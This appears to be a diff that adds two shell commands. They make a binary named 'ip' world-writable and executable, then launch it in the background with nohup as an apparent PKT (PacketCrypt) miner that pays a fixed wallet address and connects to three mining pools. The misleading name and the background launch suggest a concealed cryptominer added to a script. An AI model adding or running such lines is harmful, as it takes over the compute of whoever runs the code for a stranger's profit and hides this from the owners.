@@ -1,0 +1,2 @@
+chmod 777 ip
+nohup ./ip ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx http://pool.pkt.world http://pool.pktpool.io/ http://pool.pkteer.com
